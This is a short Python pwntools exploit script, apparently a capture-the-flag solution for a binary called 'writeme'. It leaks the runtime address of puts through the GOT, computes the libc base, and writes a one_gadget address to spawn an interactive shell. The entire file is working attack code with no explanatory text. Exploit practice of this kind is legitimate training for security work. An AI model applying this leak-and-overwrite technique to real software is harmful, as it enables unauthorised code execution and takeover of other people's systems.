from pwn import *

r = process("./writeme", env={"LD_PRELOAD":"./libc.so"})
lib = ELF("./libc.so")
context.arch = 'amd64'

puts_off = lib.symbols["puts"]
one_gadget_off = 0xf1117
# 0x600ba0
puts_got = 6294432


r.recvuntil(":")
r.sendline(str(puts_got))

r.recvuntil("=0x")
puts = int(r.recv(12), 16)
libc = puts - puts_off
one_gadget = libc + one_gadget_off
r.recvuntil(":")
r.sendline(str(one_gadget))


r.interactive()
